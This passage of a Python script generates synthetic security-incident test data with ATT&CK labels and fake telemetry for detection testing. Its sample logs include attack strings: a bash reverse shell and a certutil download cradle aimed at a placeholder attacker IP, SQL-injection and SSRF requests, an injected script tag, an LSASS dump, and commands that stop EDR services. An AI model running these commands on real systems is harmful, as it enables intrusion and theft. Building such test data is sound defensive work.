#!/usr/bin/env python3
"""
AiSOC eval-harness incident generator.
=======================================

Produces a deterministic JSON dataset of N synthetic SOC incidents for the
public eval harness, plus a parallel JSONL file of synthetic telemetry events
that back each incident (Sysmon, M365 audit, CloudTrail, Azure AD, EDR,
auditd/journald, DNS, web access, k8s audit, GitHub audit, VPN, DB audit).

Each incident JSON entry contains:

- id                  ("INC-EVAL-001" .. "INC-EVAL-NNN")
- template_id         stable slug identifying the source template
- template_index      0-based template position (0..len(TEMPLATES)-1)
- title, description  one-line summary + multi-sentence narrative
- expected_tactics    MITRE ATT&CK tactic IDs (e.g. ["TA0006", "TA0008"])
- expected_techniques MITRE technique IDs    (e.g. ["T1110.001"])
- severity            "critical" | "high" | "medium" | "low"
- response_class      containment family (isolate_host, disable_account,
                      block_indicator, rollback_change, escalate, monitor)
- evidence_keywords   atomic evidence items the report should cite
- telemetry           list of resolved synthetic event dicts (source-tagged)

The companion JSONL file (`synthetic_telemetry.jsonl`) emits one event per
line, each annotated with `incident_id`, `template_id`, and `event_index`,
which is what connector / detection / Sigma authors should wire against.

Usage
-----
    python3 scripts/generate_eval_incidents.py [--count 200] [--out PATH]
                                               [--telemetry-out PATH]
                                               [--coverage]

The output is fully deterministic given the same `--count` and the template /
telemetry data — re-running produces byte-identical files. Both artefacts are
checked into the repo; the generator is preserved for reviewability and
future expansion.

Design notes
------------
- Per Tim Michaud's feedback (P25, Nov 2026): the substrate has no per-host
  code paths, so cycling 55 templates 3-4× would dilute regression signal
  (one broken template = ~0.5% per-case loss but ~1.8% per-template loss).
  We keep the placeholder variations (they exercise the tactic extractor's
  word-boundary handling and look like realistic SOC fan-out), but expose
  `template_id` so the eval harness reports BOTH per-case and per-template
  metrics.  See `apps/docs/docs/benchmark.md`.
- Synthetic telemetry events live alongside the narrative description so that
  connector PRs and Sigma rules have something concrete to wire against.
  Field shapes follow the canonical schema for each source (Sysmon EventIDs,
  Microsoft 365 Unified Audit Log Operations, CloudTrail Records, Azure AD
  signInLogs, etc.) — exact enough to write detections against, generic
  enough that we don't pretend to be a full data generator.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

# ---------------------------------------------------------------------------
# Param pools — small, deterministic, evocative
# ---------------------------------------------------------------------------

HOSTNAMES = [
    "WIN-FIN-DB01", "WIN-PROD-WEB02", "WIN-HR-DESKTOP", "WIN-DEVOPS-LT",
    "LIN-K8S-NODE01", "LIN-BUILD-CI03", "LIN-EDGE-VPN02", "MAC-CFO-LAPTOP",
    "MAC-LEGAL-LAPTOP", "WIN-DC-PRIMARY", "WIN-DC-SECONDARY", "WIN-EXCHANGE-01",
    "LIN-OBS-LOGGER", "LIN-DB-REPLICA", "WIN-FILE-SHARE", "K8S-PROD-CLUSTER",
    "AWS-EC2-PROD-API", "AZURE-VM-FIN-001", "GCP-GKE-NODE-04",
]

USERS = [
    "alice@aisoc.dev", "bob@aisoc.dev", "carol@aisoc.dev", "dave@aisoc.dev",
    "eve@aisoc.dev", "frank@aisoc.dev", "grace@aisoc.dev", "heidi@aisoc.dev",
    "svc-deploy@aisoc.dev", "svc-backup@aisoc.dev", "admin@aisoc.dev",
    "cfo@aisoc.dev", "ceo@aisoc.dev", "ops-lead@aisoc.dev",
]

ATTACKER_IPS = [
    "192.168.1.100", "10.0.99.42", "172.16.50.7", "203.0.113.45",
    "198.51.100.23", "185.220.101.7", "45.142.122.111", "91.134.231.15",
]

CAMPAIGNS = [
    "LockBit 3.0", "ALPHV/BlackCat", "APT28", "APT29", "Emotet epoch 5",
    "Lazarus", "FIN7", "MagicWeb", "MosaicRegressor", "Volt Typhoon",
    "Scattered Spider", "Cobalt Strike",
]

# ---------------------------------------------------------------------------
# Telemetry event factories
#
# Each helper returns a `dict[str, Any]` whose `source` field tags the data
# source and whose remaining fields use the canonical naming convention for
# that source so detection authors can wire Sigma / KQL / SPL rules straight
# at them.  Placeholders ({host}, {user}, {ip}, ...) are left in place and
# resolved per-incident by the recursive resolver further down.
# ---------------------------------------------------------------------------


def _sysmon(event_id: int, **fields: Any) -> dict[str, Any]:
    """Sysmon for Windows event (Microsoft-Windows-Sysmon/Operational)."""
    return {
        "source": "sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "Provider": "Microsoft-Windows-Sysmon",
        "EventID": event_id,
        **fields,
    }


def _winsec(event_id: int, **fields: Any) -> dict[str, Any]:
    """Windows Security event log (4624, 4688, 4720, etc.)."""
    return {
        "source": "windows_security",
        "channel": "Security",
        "Provider": "Microsoft-Windows-Security-Auditing",
        "EventID": event_id,
        **fields,
    }


def _m365(operation: str, workload: str = "Exchange", **fields: Any) -> dict[str, Any]:
    """Microsoft 365 Unified Audit Log row (Audit.Exchange / AAD / SharePoint)."""
    return {
        "source": "m365_audit",
        "Workload": workload,
        "Operation": operation,
        **fields,
    }


def _azure_signin(**fields: Any) -> dict[str, Any]:
    """Azure AD sign-in log (signInLogs)."""
    return {
        "source": "azure_signin",
        "category": "SignInLogs",
        **fields,
    }


def _cloudtrail(event_name: str, event_source: str, **fields: Any) -> dict[str, Any]:
    """AWS CloudTrail Record."""
    return {
        "source": "cloudtrail",
        "eventName": event_name,
        "eventSource": event_source,
        "awsRegion": fields.pop("awsRegion", "us-east-1"),
        **fields,
    }


def _auditd(syscall: str, **fields: Any) -> dict[str, Any]:
    """Linux auditd (type=SYSCALL / EXECVE)."""
    return {
        "source": "linux_auditd",
        "type": "SYSCALL",
        "syscall": syscall,
        **fields,
    }


def _journald(unit: str, **fields: Any) -> dict[str, Any]:
    """systemd-journald event row."""
    return {
        "source": "linux_journald",
        "_SYSTEMD_UNIT": unit,
        **fields,
    }


def _edr(rule: str, severity: str = "high", **fields: Any) -> dict[str, Any]:
    """Generic EDR detection event (CrowdStrike/Defender/SentinelOne shape)."""
    return {
        "source": "edr",
        "rule": rule,
        "severity": severity,
        **fields,
    }


def _dns(qname: str, qtype: str = "A", **fields: Any) -> dict[str, Any]:
    """DNS resolver / passive DNS row."""
    return {
        "source": "dns",
        "query_name": qname,
        "query_type": qtype,
        **fields,
    }


def _web(method: str, url: str, status: int = 200, **fields: Any) -> dict[str, Any]:
    """Web access / WAF / proxy log row."""
    return {
        "source": "web_access",
        "http_method": method,
        "url": url,
        "status_code": status,
        **fields,
    }


def _k8s(verb: str, resource: str, **fields: Any) -> dict[str, Any]:
    """Kubernetes audit log (audit.k8s.io)."""
    return {
        "source": "k8s_audit",
        "apiVersion": "audit.k8s.io/v1",
        "kind": "Event",
        "verb": verb,
        "objectRef": {"resource": resource, **fields.pop("objectRef", {})},
        **fields,
    }


def _github(action: str, **fields: Any) -> dict[str, Any]:
    """GitHub audit log entry."""
    return {
        "source": "github_audit",
        "action": action,
        **fields,
    }


def _vpn(action: str, **fields: Any) -> dict[str, Any]:
    """VPN gateway log (Cisco AnyConnect / GlobalProtect / etc.)."""
    return {
        "source": "vpn",
        "action": action,
        **fields,
    }


def _db(operation: str, **fields: Any) -> dict[str, Any]:
    """Database audit log row (e.g. pgaudit, MSSQL audit, MySQL audit)."""
    return {
        "source": "db_audit",
        "operation": operation,
        **fields,
    }


# ---------------------------------------------------------------------------
# Template definitions — each template covers a tactic+technique pair plus
# 1-3 synthetic telemetry events that exercise the canonical detection path.
#
# Adding a new template:
#   1. Pick a stable `template_id` slug (kebab-case, never reused).
#   2. Cite at least one tactic + technique pair MITRE ATT&CK ID.
#   3. Add ≥1 telemetry event using the factories above.
#   4. Use {host}/{user}/{ip}/{campaign}/{ext}/{target_host} placeholders so
#      the resolver can fan them out across the dataset; the resolver walks
#      strings, dicts, and lists recursively.
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class Template:
    template_id: str
    title: str
    description: str
    tactics: tuple[str, ...]
    techniques: tuple[str, ...]
    severity: str
    response_class: str
    evidence_keywords: tuple[str, ...]
    placeholders: tuple[str, ...] = field(default_factory=tuple)
    telemetry: tuple[dict[str, Any], ...] = field(default_factory=tuple)


TEMPLATES: list[Template] = [
    # ─────────────────────────────────────────────────────────
    # Initial Access (TA0001)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="phishing-macro-email",
        title="Spear-phishing email with macro-laden attachment delivered to {user}",
        description=(
            "Inbound email from {ip} delivered an Office document with a malicious VBA macro to "
            "{user}. Attachment opened on {host}; macro spawned cmd.exe and downloaded a stage-2 "
            "payload from a known {campaign} infrastructure."
        ),
        tactics=("TA0001", "TA0002"),
        techniques=("T1566.001", "T1059.005"),
        severity="high",
        response_class="block_indicator",
        evidence_keywords=("phishing email", "macro", "{ip}", "{host}", "{user}", "stage-2 payload"),
        placeholders=("user", "ip", "host", "campaign"),
        telemetry=(
            _m365(
                "Send",
                workload="Exchange",
                UserId="{user}",
                ClientIP="{ip}",
                Subject="Q4 invoice (action required)",
                AttachmentNames=["invoice_q4.docm"],
            ),
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\cmd.exe",
                ParentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                CommandLine="cmd.exe /c powershell -nop -w hidden -enc <stage2>",
            ),
            _edr(
                "Office macro spawned cmd.exe",
                Computer="{host}",
                User="{user}",
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="webapp-sqli-ssrf-exploit",
        title="Exploitation of public-facing web app on {host}",
        description=(
            "WAF logs show SQL-injection and SSRF probes from {ip} against the application on "
            "{host}. One request returned 200 with internal cloud-metadata content. Likely "
            "exploitation of CVE-2024-1234."
        ),
        tactics=("TA0001", "TA0007"),
        techniques=("T1190", "T1082"),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("WAF", "SQL injection", "SSRF", "CVE-2024-1234", "{host}", "{ip}"),
        placeholders=("ip", "host"),
        telemetry=(
            _web(
                "GET",
                url="https://{host}/search?q=' OR 1=1--",
                status=200,
                src_ip="{ip}",
                user_agent="curl/8.4.0",
                rule_match="WAF:SQLI:1011",
                cve="CVE-2024-1234",
            ),
            _web(
                "GET",
                url="https://{host}/proxy?u=http://169.254.169.254/latest/meta-data/",
                status=200,
                src_ip="{ip}",
                user_agent="curl/8.4.0",
                rule_match="WAF:SSRF:2007",
            ),
        ),
    ),
    Template(
        template_id="confluence-watering-hole",
        title="Watering-hole exploit served from internal Confluence by {ip}",
        description=(
            "Internal Confluence page injected with malicious JavaScript by {ip}. Drive-by exploit "
            "triggered browser exploitation on multiple visitors including {user}. Linked to "
            "{campaign} TTPs."
        ),
        tactics=("TA0001", "TA0002"),
        techniques=("T1189", "T1203"),
        severity="high",
        response_class="block_indicator",
        evidence_keywords=("watering hole", "drive-by", "Confluence", "{ip}", "{user}", "{campaign}"),
        placeholders=("ip", "user", "campaign"),
        telemetry=(
            _web(
                "POST",
                url="https://confluence.aisoc.dev/pages/editpage.action?pageId=8472",
                status=200,
                src_ip="{ip}",
                user_agent="Mozilla/5.0",
                payload_excerpt="<script src=//{ip}/x.js></script>",
            ),
            _edr(
                "Browser exploitation: drive-by JavaScript loader",
                Computer="WIN-HR-DESKTOP",
                User="{user}",
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="npm-supply-chain",
        title="Supply-chain compromise: malicious npm package on {host}",
        description=(
            "CI pipeline on {host} installed compromised npm package `event-stream`. Post-install "
            "hook executed reverse shell to {ip}. Build artefacts may be tainted."
        ),
        tactics=("TA0001", "TA0002"),
        techniques=("T1195.001", "T1059.007"),
        severity="critical",
        response_class="rollback_change",
        evidence_keywords=("supply chain", "npm package", "event-stream", "post-install", "{host}", "{ip}"),
        placeholders=("host", "ip"),
        telemetry=(
            _auditd(
                "execve",
                exe="/usr/bin/node",
                a0="node",
                a1="/tmp/node_modules/event-stream/postinstall.js",
                hostname="{host}",
                user="ci-runner",
            ),
            _github(
                "workflow_run.completed",
                workflow="ci.yml",
                actor="dependabot[bot]",
                repository="aisoc/web",
                conclusion="success",
                package_added="event-stream@4.0.1",
            ),
            _edr(
                "npm post-install reverse shell",
                Computer="{host}",
                User="ci-runner",
                dest_ip="{ip}",
                dest_port=4444,
            ),
        ),
    ),
    Template(
        template_id="usb-autorun-airgap",
        title="Malicious USB autorun on air-gapped host {host}",
        description=(
            "USB device inserted on air-gapped {host} by {user}. AutoRun executed Python stager "
            "that collected local files. Data staged in C:\\Temp\\."
        ),
        tactics=("TA0001", "TA0009"),
        techniques=("T1091", "T1005"),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("USB", "autorun", "air-gapped", "{host}", "{user}", "Python stager"),
        placeholders=("host", "user"),
        telemetry=(
            _winsec(
                6416,
                Computer="{host}",
                SubjectUserName="{user}",
                ClassName="USB",
                DeviceDescription="SanDisk Cruzer 16GB",
            ),
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Python311\\python.exe",
                ParentImage="C:\\Windows\\System32\\rundll32.exe",
                CommandLine="python.exe E:\\autorun.py --stage C:\\Temp\\",
            ),
        ),
    ),
    Template(
        template_id="oauth-consent-phish",
        title="OAuth consent phishing targeting {user}",
        description=(
            "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by {user}. "
            "Inbox forwarding rule created sending mail to {ip}."
        ),
        tactics=("TA0001", "TA0006"),
        techniques=("T1528", "T1550.001"),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("OAuth consent", "Mail.Read", "Files.Read.All", "{user}", "{ip}", "forwarding rule"),
        placeholders=("user", "ip"),
        telemetry=(
            _m365(
                "Consent to application.",
                workload="AzureActiveDirectory",
                UserId="{user}",
                ApplicationId="00000003-0000-0ff1-ce00-000000000000",
                ConsentedScopes=["Mail.Read", "Files.Read.All", "offline_access"],
            ),
            _m365(
                "New-InboxRule",
                workload="Exchange",
                UserId="{user}",
                Parameters={"Name": "Auto-fwd", "ForwardTo": "ext@{ip}", "DeleteMessage": True},
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Execution (TA0002)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="powershell-obfuscated-dropper",
        title="Obfuscated PowerShell dropper executed on {host}",
        description=(
            "PowerShell dropper executed on {host} by {user}; payload base64-encoded and decoded "
            "in-memory. Linked to {campaign} ransomware staging."
        ),
        tactics=("TA0002", "TA0005"),
        techniques=("T1059.001", "T1027"),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("powershell", "obfuscated", "base64", "{host}", "{user}", "{campaign}"),
        placeholders=("host", "user", "campaign"),
        telemetry=(
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                ParentImage="C:\\Windows\\explorer.exe",
                CommandLine="powershell.exe -nop -w hidden -enc JABzAD0ATgB...",
            ),
            _winsec(
                4104,
                Computer="{host}",
                User="{user}",
                ScriptBlockText="$s=[System.Convert]::FromBase64String(...);[Reflection.Assembly]::Load($s).EntryPoint.Invoke(...)",
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="certutil-download-cradle",
        title="Living-off-the-land: certutil download cradle on {host}",
        description=(
            "certutil.exe -urlcache invoked from cmd.exe on {host}. cmd.exe was spawned by "
            "outlook.exe. Payload downloaded from {ip}."
        ),
        tactics=("TA0002", "TA0005"),
        techniques=("T1105", "T1218.009"),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("certutil", "urlcache", "outlook.exe", "{host}", "{ip}", "download cradle"),
        placeholders=("host", "ip"),
        telemetry=(
            _sysmon(
                1,
                Computer="{host}",
                Image="C:\\Windows\\System32\\certutil.exe",
                ParentImage="C:\\Windows\\System32\\cmd.exe",
                CommandLine="certutil -urlcache -split -f http://{ip}/p.exe %TEMP%\\p.exe",
            ),
            _sysmon(
                3,
                Computer="{host}",
                Image="C:\\Windows\\System32\\certutil.exe",
                DestinationIp="{ip}",
                DestinationPort=80,
                Protocol="tcp",
            ),
        ),
    ),
    Template(
        template_id="docker-runtime-abuse",
        title="Container runtime abuse: malicious `docker run` on {host}",
        description=(
            "Unauthenticated Docker API on {host} exploited from {ip}. Container with cryptominer "
            "spawned. CPU on host saturated to 95%."
        ),
        tactics=("TA0002", "TA0001", "TA0040"),
        techniques=("T1610", "T1059.004", "T1496"),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("docker", "container", "cryptominer", "miner", "{host}", "{ip}"),
        placeholders=("host", "ip"),
        telemetry=(
            _web(
                "POST",
                url="http://{host}:2375/containers/create",
                status=201,
                src_ip="{ip}",
                request_body={"Image": "monero/xmrig", "HostConfig": {"Privileged": True}},
            ),
            _auditd(
                "execve",
                exe="/usr/bin/docker",
                a0="docker",
                a1="run",
                a2="--privileged",
                hostname="{host}",
                user="root",
            ),
        ),
    ),
    Template(
        template_id="wmi-event-subscription",
        title="Malicious WMI subscription on {host}",
        description=(
            "Permanent WMI event subscription created on {host} by {user}. Consumer runs encoded "
            "script. Persistence + execution mechanism."
        ),
        tactics=("TA0002", "TA0003"),
        techniques=("T1546.003", "T1059.001"),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("WMI", "subscription", "permanent", "{host}", "{user}", "encoded script"),
        placeholders=("host", "user"),
        telemetry=(
            _sysmon(
                19,
                Computer="{host}",
                User="{user}",
                EventNamespace="ROOT\\Subscription",
                Name="UpdaterFilter",
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60",
            ),
            _sysmon(
                21,
                Computer="{host}",
                Operation="Created",
                Name="UpdaterConsumer",
                Type="CommandLineEventConsumer",
                Destination="powershell.exe -enc <encoded>",
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Persistence (TA0003)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="registry-run-persistence",
        title="Registry Run key persistence created by {user} on {host}",
        description=(
            "New value written to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run on "
            "{host}. Points to roaming binary signed with revoked cert. Linked to {campaign}."
        ),
        tactics=("TA0003",),
        techniques=("T1547.001",),
        severity="medium",
        response_class="rollback_change",
        evidence_keywords=("registry run", "persistence", "revoked cert", "{host}", "{user}", "{campaign}"),
        placeholders=("user", "host", "campaign"),
        telemetry=(
            _sysmon(
                13,
                Computer="{host}",
                User="{user}",
                EventType="SetValue",
                TargetObject="HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                Details="C:\\Users\\{user}\\AppData\\Roaming\\updater.exe",
            ),
            _edr(
                "Persistence: Registry Run with revoked-cert signed binary",
                Computer="{host}",
                User="{user}",
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="scheduled-task-persistence",
        title="Scheduled task persistence on {host}",
        description=(
            "Hidden scheduled task created on {host} by {user}: triggers every 30 minutes, runs "
            "script from %APPDATA%\\Roaming. Persistence mechanism."
        ),
        tactics=("TA0003",),
        techniques=("T1053.005",),
        severity="medium",
        response_class="rollback_change",
        evidence_keywords=("scheduled task", "persistence", "APPDATA", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _winsec(
                4698,
                Computer="{host}",
                SubjectUserName="{user}",
                TaskName="\\Microsoft\\Windows\\UpdaterTask",
                TaskContent="<Hidden>true</Hidden><Exec>%APPDATA%\\Roaming\\u.ps1</Exec>",
            ),
            _sysmon(
                1,
                Computer="{host}",
                Image="C:\\Windows\\System32\\schtasks.exe",
                ParentImage="C:\\Windows\\System32\\cmd.exe",
                CommandLine="schtasks /Create /SC MINUTE /MO 30 /TN UpdaterTask /TR \"powershell -f %APPDATA%\\Roaming\\u.ps1\" /F",
                User="{user}",
            ),
        ),
    ),
    Template(
        template_id="uefi-firmware-implant",
        title="Firmware implant detected on UEFI partition of {host}",
        description=(
            "UEFI secure-boot violation on {host}. Unknown module detected in firmware. Signature "
            "matches MosaicRegressor implant."
        ),
        tactics=("TA0003", "TA0005"),
        techniques=("T1542.001", "T1027.002"),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("UEFI", "firmware", "implant", "secure boot", "{host}", "MosaicRegressor"),
        placeholders=("host",),
        telemetry=(
            _winsec(
                4673,
                Computer="{host}",
                ObjectName="\\Device\\HarddiskVolume1\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
                ProcessName="C:\\Windows\\System32\\driver_signing.exe",
            ),
            _edr(
                "UEFI implant: MosaicRegressor signature match",
                Computer="{host}",
                severity="critical",
                indicator_path="ESP:/EFI/Boot/bootx64.efi",
            ),
        ),
    ),
    Template(
        template_id="cron-backdoor",
        title="Backdoor cron job installed on {host}",
        description=(
            "/etc/cron.d entry created by {user} on {host}. Reverse shell beacon to {ip} every 5 "
            "minutes."
        ),
        tactics=("TA0003", "TA0011"),
        techniques=("T1053.003", "T1071.001"),
        severity="high",
        response_class="rollback_change",
        evidence_keywords=("cron", "backdoor", "reverse shell", "{host}", "{user}", "{ip}"),
        placeholders=("host", "user", "ip"),
        telemetry=(
            _auditd(
                "openat",
                exe="/usr/bin/vi",
                path="/etc/cron.d/zz-update",
                hostname="{host}",
                user="{user}",
                a2="O_WRONLY|O_CREAT",
            ),
            _journald(
                "cron.service",
                MESSAGE="(root) CMD (/bin/bash -i >& /dev/tcp/{ip}/4444 0>&1)",
                hostname="{host}",
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Privilege Escalation (TA0004)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="uac-bypass-fodhelper",
        title="UAC bypass observed on {host}",
        description=(
            "fodhelper.exe abuse on {host} by {user}; auto-elevation triggered without prompt. "
            "Process tree shows escalation to SYSTEM."
        ),
        tactics=("TA0004", "TA0005"),
        techniques=("T1548.002",),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("UAC", "fodhelper", "auto-elevation", "{host}", "{user}", "SYSTEM"),
        placeholders=("host", "user"),
        telemetry=(
            _sysmon(
                13,
                Computer="{host}",
                User="{user}",
                EventType="SetValue",
                TargetObject="HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
                Details="C:\\Windows\\System32\\cmd.exe /c whoami",
            ),
            _sysmon(
                1,
                Computer="{host}",
                Image="C:\\Windows\\System32\\fodhelper.exe",
                ParentImage="C:\\Windows\\explorer.exe",
                IntegrityLevel="High",
                User="SYSTEM",
            ),
        ),
    ),
    Template(
        template_id="k8s-privileged-pod-escape",
        title="Container escape via privileged pod on {host}",
        description=(
            "Kubernetes privileged pod created on {host} by {user}. cgroup escape to host "
            "namespace observed. Node filesystem accessed."
        ),
        tactics=("TA0004", "TA0007"),
        techniques=("T1611", "T1082"),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("kubernetes", "privileged pod", "container escape", "cgroup", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _k8s(
                "create",
                resource="pods",
                user={"username": "{user}"},
                requestObject={
                    "spec": {
                        "containers": [
                            {"name": "x", "image": "alpine", "securityContext": {"privileged": True}}
                        ],
                        "hostPID": True,
                    }
                },
                stage="ResponseComplete",
                responseStatus={"code": 201},
                node="{host}",
            ),
            _auditd(
                "openat",
                exe="/bin/sh",
                path="/host/etc/shadow",
                hostname="{host}",
                user="root",
            ),
        ),
    ),
    Template(
        template_id="linux-suid-abuse",
        title="Linux SUID binary abuse on {host}",
        description=(
            "Custom SUID binary discovered in /tmp on {host}; allows arbitrary command execution "
            "as root. Likely escalation by {user}."
        ),
        tactics=("TA0004",),
        techniques=("T1548.001",),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("SUID", "/tmp", "root escalation", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _auditd(
                "chmod",
                exe="/bin/chmod",
                a1="/tmp/.x",
                mode="04755",
                hostname="{host}",
                user="{user}",
            ),
            _auditd(
                "execve",
                exe="/tmp/.x",
                hostname="{host}",
                uid=1001,
                euid=0,
                user="{user}",
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Defense Evasion (TA0005)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="process-hollowing-svchost",
        title="Memory-only fileless implant in svchost on {host}",
        description=(
            "Process hollowing detected on {host}: svchost.exe replaced with Cobalt Strike beacon "
            "to {ip}. No disk artefacts. Linked to {campaign}."
        ),
        tactics=("TA0002", "TA0005"),
        techniques=("T1055.012", "T1620"),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("process hollowing", "fileless", "svchost", "Cobalt Strike", "{host}", "{ip}"),
        placeholders=("host", "ip", "campaign"),
        telemetry=(
            _sysmon(
                8,
                Computer="{host}",
                SourceImage="C:\\Windows\\System32\\powershell.exe",
                TargetImage="C:\\Windows\\System32\\svchost.exe",
                StartFunction="LoadLibraryW",
                NewThreadId=4716,
            ),
            _sysmon(
                3,
                Computer="{host}",
                Image="C:\\Windows\\System32\\svchost.exe",
                DestinationIp="{ip}",
                DestinationPort=443,
                Protocol="tcp",
                ja3="a0e9f5d64349fb13191bc781f81f42e1",
            ),
            _edr(
                "Cobalt Strike beacon (process hollowing)",
                Computer="{host}",
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="event-log-cleared",
        title="Indicator removal: Windows event log cleared on {host}",
        description=(
            "Security event log cleared on {host} by {user}. wevtutil.exe cl Security observed in "
            "command-line telemetry."
        ),
        tactics=("TA0005",),
        techniques=("T1070.001",),
        severity="high",
        response_class="escalate",
        evidence_keywords=("wevtutil", "log cleared", "indicator removal", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _winsec(
                1102,
                Computer="{host}",
                SubjectUserName="{user}",
                Channel="Security",
                Description="The audit log was cleared.",
            ),
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\wevtutil.exe",
                CommandLine="wevtutil cl Security",
            ),
        ),
    ),
    Template(
        template_id="disable-edr-tooling",
        title="Disable security tooling on {host}",
        description=(
            "{user} attempted to stop Defender, CrowdStrike, and Sysmon on {host}. Tampering "
            "telemetry triggered alert."
        ),
        tactics=("TA0005",),
        techniques=("T1562.001",),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("defender", "crowdstrike", "sysmon", "tampering", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\sc.exe",
                CommandLine="sc.exe stop CSAgent",
            ),
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\sc.exe",
                CommandLine="sc.exe stop WinDefend",
            ),
            _edr("EDR tampering attempt", Computer="{host}", User="{user}", severity="critical"),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Credential Access (TA0006)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="lsass-memory-dump",
        title="LSASS memory dump on {host} by {user}",
        description=(
            "comsvcs.dll MiniDump observed on {host}. lsass.exe memory dumped to "
            "C:\\Windows\\Temp\\. Mimikatz signatures detected."
        ),
        tactics=("TA0006",),
        techniques=("T1003.001",),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("lsass", "minidump", "comsvcs", "mimikatz", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _sysmon(
                10,
                Computer="{host}",
                SourceImage="C:\\Windows\\System32\\rundll32.exe",
                TargetImage="C:\\Windows\\System32\\lsass.exe",
                GrantedAccess="0x1010",
                CallTrace="comsvcs.dll+5d24|MiniDumpWriteDump",
                User="{user}",
            ),
            _sysmon(
                11,
                Computer="{host}",
                Image="C:\\Windows\\System32\\rundll32.exe",
                TargetFilename="C:\\Windows\\Temp\\lsass.dmp",
                User="{user}",
            ),
        ),
    ),
    Template(
        template_id="credential-spray",
        title="Brute-force credential spray against {user} from {ip}",
        description=(
            "Credential spray from {ip} against {user}. 1500 password attempts in 30 minutes. "
            "One success followed by anomalous Azure AD sign-in."
        ),
        tactics=("TA0006",),
        techniques=("T1110.003",),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("brute force", "credential spray", "{user}", "{ip}", "azure ad"),
        placeholders=("user", "ip"),
        telemetry=(
            _azure_signin(
                userPrincipalName="{user}",
                ipAddress="{ip}",
                resultType=50126,
                resultDescription="Invalid username or password",
                appDisplayName="Office 365 Exchange Online",
                attempt_count=1500,
            ),
            _azure_signin(
                userPrincipalName="{user}",
                ipAddress="{ip}",
                resultType=0,
                resultDescription="Success",
                conditionalAccessStatus="success",
                riskLevelAggregated="high",
            ),
        ),
    ),
    Template(
        template_id="kerberoasting",
        title="Kerberoasting from {host}",
        description=(
            "Service account TGS tickets requested en-masse from {host} by {user}. AES256 → RC4 "
            "downgrade observed. Mimikatz tooling indicators."
        ),
        tactics=("TA0006", "TA0008"),
        techniques=("T1558.003", "T1021.001"),
        severity="critical",
        response_class="disable_account",
        evidence_keywords=("kerberoast", "TGS", "RC4", "mimikatz", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _winsec(
                4769,
                Computer="WIN-DC-PRIMARY",
                TargetUserName="{user}",
                ServiceName="MSSQLSvc/sql.aisoc.dev",
                TicketEncryptionType="0x17",
                IpAddress="{host}",
            ),
            _winsec(
                4769,
                Computer="WIN-DC-PRIMARY",
                TargetUserName="{user}",
                ServiceName="HTTP/web01.aisoc.dev",
                TicketEncryptionType="0x17",
                IpAddress="{host}",
            ),
        ),
    ),
    Template(
        template_id="ad-dcsync",
        title="Active Directory DCSync from non-DC host {host}",
        description=(
            "Replication rights abused from {host} by {user}. All domain NTLM hashes replicated. "
            "Severe credential exposure."
        ),
        tactics=("TA0006", "TA0004"),
        techniques=("T1003.006", "T1078.002"),
        severity="critical",
        response_class="disable_account",
        evidence_keywords=("dcsync", "replication", "ntlm hash", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _winsec(
                4662,
                Computer="WIN-DC-PRIMARY",
